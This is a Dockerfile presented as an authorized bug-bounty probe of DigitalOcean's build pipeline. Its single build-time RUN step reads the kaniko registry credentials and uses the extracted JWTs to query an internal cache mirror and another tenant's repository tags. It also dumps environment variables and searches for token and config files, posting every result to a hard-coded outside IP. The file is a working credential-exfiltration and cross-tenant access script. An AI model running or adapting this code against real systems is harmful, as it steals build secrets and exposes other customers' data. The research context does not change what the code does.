FROM alpine:3.20

RUN apk add --no-cache curl jq bash coreutils

# Authorized bug-bounty probe: DigitalOcean program on Intigriti
# Researcher: greghax01@intigriti.me. Greg-owned resources only.
# READ-ONLY registry probes against build-phase accessible endpoints.

RUN bash -c 'set +e; \
OOB="http://3.218.67.46/docr-jwt-probe"; \
echo "=== DOCR JWT scope probe ===" >&2; \
\
echo "--- Phase 1: Extract build JWT ---" >&2; \
if [ -f /kaniko/.docker/config.json ]; then \
  JWT_DATA=$(cat /kaniko/.docker/config.json); \
  curl -s -X POST "$OOB/jwt-found" -d "$JWT_DATA" --connect-timeout 5 2>/dev/null; \
  echo "JWT found in /kaniko/.docker/config.json" >&2; \
  \
  # Extract the registrytoken for apps-nyc.docr.space \
  APPS_TOKEN=$(echo "$JWT_DATA" | jq -r ".registrytokens[\"apps-nyc.docr.space\"] // empty"); \
  REG_TOKEN=$(echo "$JWT_DATA" | jq -r ".registrytokens[\"registry.digitalocean.com\"] // empty"); \
  \
  echo "--- Phase 2: Test JWT against internal mirror ---" >&2; \
  \
  # Test 2a: docker-cache mirror catalog with build JWT \
  MIRROR_CATALOG=$(curl -s --connect-timeout 5 "http://docker-cache.docker-cache.svc.cluster.local:5000/v2/_catalog?n=200" 2>/dev/null); \
  curl -s -X POST "$OOB/mirror-catalog-noauth" -d "$MIRROR_CATALOG" --connect-timeout 5 2>/dev/null; \
  \
  # Test 2b: docker-cache mirror catalog WITH build JWT \
  if [ -n "$APPS_TOKEN" ]; then \
    MIRROR_CATALOG_AUTH=$(curl -s --connect-timeout 5 "http://docker-cache.docker-cache.svc.cluster.local:5000/v2/_catalog?n=200" -H "Authorization: Bearer $APPS_TOKEN" 2>/dev/null); \
    curl -s -X POST "$OOB/mirror-catalog-apps-jwt" -d "$MIRROR_CATALOG_AUTH" --connect-timeout 5 2>/dev/null; \
  fi; \
  if [ -n "$REG_TOKEN" ]; then \
    MIRROR_CATALOG_REG=$(curl -s --connect-timeout 5 "http://docker-cache.docker-cache.svc.cluster.local:5000/v2/_catalog?n=200" -H "Authorization: Bearer $REG_TOKEN" 2>/dev/null); \
    curl -s -X POST "$OOB/mirror-catalog-reg-jwt" -d "$MIRROR_CATALOG_REG" --connect-timeout 5 2>/dev/null; \
  fi; \
  \
  echo "--- Phase 3: Test JWT against apps-nyc.docr.space for cross-tenant ---" >&2; \
  \
  # Try catalog on apps-nyc.docr.space with both JWTs \
  if [ -n "$APPS_TOKEN" ]; then \
    APPS_CATALOG=$(curl -s --connect-timeout 5 "https://apps-nyc.docr.space/v2/_catalog?n=200" -H "Authorization: Bearer $APPS_TOKEN" 2>/dev/null); \
    curl -s -X POST "$OOB/apps-catalog-apps-jwt" -d "$APPS_CATALOG" --connect-timeout 5 2>/dev/null; \
    \
    # Decode JWT claims \
    JWT_CLAIMS=$(echo "$APPS_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null); \
    curl -s -X POST "$OOB/apps-jwt-claims" -d "$JWT_CLAIMS" --connect-timeout 5 2>/dev/null; \
  fi; \
  if [ -n "$REG_TOKEN" ]; then \
    REG_CATALOG=$(curl -s --connect-timeout 5 "https://apps-nyc.docr.space/v2/_catalog?n=200" -H "Authorization: Bearer $REG_TOKEN" 2>/dev/null); \
    curl -s -X POST "$OOB/apps-catalog-reg-jwt" -d "$REG_CATALOG" --connect-timeout 5 2>/dev/null; \
    \
    JWT_CLAIMS2=$(echo "$REG_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null); \
    curl -s -X POST "$OOB/reg-jwt-claims" -d "$JWT_CLAIMS2" --connect-timeout 5 2>/dev/null; \
  fi; \
  \
  echo "--- Phase 4: Test JWT against internal mirror for apps-nyc3 repos ---" >&2; \
  \
  # Try to list repos on the mirror that match the apps-nyc3 pattern \
  # Mirror is unauthenticated: just look for apps-nyc3 pattern repos in the catalog \
  FULL_CATALOG=$(curl -s --connect-timeout 5 "http://docker-cache.docker-cache.svc.cluster.local:5000/v2/_catalog?n=500" 2>/dev/null); \
  curl -s -X POST "$OOB/mirror-full-catalog" -d "$FULL_CATALOG" --connect-timeout 5 2>/dev/null; \
  \
  echo "--- Phase 5: Try apps-nyc.docr.space with apps-nyc3 paths ---" >&2; \
  \
  # Extract our own app UUID from JWT claims \
  OWN_APP_UUID=""; \
  if [ -n "$APPS_TOKEN" ]; then \
    OWN_APP_UUID=$(echo "$APPS_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r ".access[0].name // empty" 2>/dev/null | sed "s|apps-nyc3-||" | cut -d/ -f1); \
    curl -s -X POST "$OOB/own-app-uuid" -d "$OWN_APP_UUID" --connect-timeout 5 2>/dev/null; \
  fi; \
  \
  # Try to read a known other app UUID from apps-nyc.docr.space \
  # Account B app from prior missions: 7b77721d-... \
  if [ -n "$APPS_TOKEN" ]; then \
    XTENANT=$(curl -s --connect-timeout 5 "https://apps-nyc.docr.space/v2/apps-nyc3-7b77721d-0000-0000-0000-000000000000/web/tags/list" -H "Authorization: Bearer $APPS_TOKEN" 2>/dev/null); \
    curl -s -X POST "$OOB/xtenant-tags" -d "$XTENANT" --connect-timeout 5 2>/dev/null; \
  fi; \
  \
  echo "--- Phase 6: ENV and credential dump ---" >&2; \
  \
  ENVDUMP=$(env | sort | grep -iE "DOCKER|REGISTRY|TOKEN|AUTH|MIRROR|CACHE|APP|IMAGE" 2>/dev/null); \
  curl -s -X POST "$OOB/env-dump" -d "$ENVDUMP" --connect-timeout 5 2>/dev/null; \
  \
  # Check for any other config files \
  CRED_FILES=$(find / -name "config.json" -o -name ".dockerconfigjson" -o -name "*.token" 2>/dev/null | head -20); \
  curl -s -X POST "$OOB/cred-files" -d "$CRED_FILES" --connect-timeout 5 2>/dev/null; \
  \
else \
  echo "No /kaniko/.docker/config.json found" >&2; \
  curl -s -X POST "$OOB/no-jwt" -d "No kaniko config found" --connect-timeout 5 2>/dev/null; \
  \
  # Try mirror anyway (its unauthenticated from the build) \
  MIRROR_TEST=$(curl -s --connect-timeout 5 "http://docker-cache.docker-cache.svc.cluster.local:5000/v2/_catalog?n=500" 2>/dev/null); \
  curl -s -X POST "$OOB/mirror-nokaniko" -d "$MIRROR_TEST" --connect-timeout 5 2>/dev/null; \
fi; \
\
echo "Probe complete" >&2; \
true'

CMD ["echo", "probe-complete"]
